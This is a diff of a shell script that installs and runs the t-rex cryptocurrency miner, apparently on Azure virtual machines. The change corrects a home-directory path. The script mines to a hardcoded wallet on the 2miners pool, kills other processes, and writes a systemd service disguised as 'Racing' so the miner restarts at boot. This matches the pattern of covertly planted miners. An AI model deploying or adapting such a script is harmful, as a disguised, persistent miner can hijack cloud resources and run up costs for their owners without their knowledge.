@@ -1,4 +1,4 @@
-cd /home/azure
+cd /home/azureuser
 woker+=$(date +'%d%m_%H%M%S')
 if [[ ! -f isHaveSetupCoin.txt ]]
 then
@@ -21,6 +21,6 @@ else
     sudo killall XXX
     ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w $woker &
 fi
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azure/t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w myworker1111\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azureuser/t-rex -a ethash -o us-eth.2miners.com:2020 -u 1CpdrqVY6j6VK2qTA8PCgWNtw3TWpukcVc -p x -w myworker1111\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
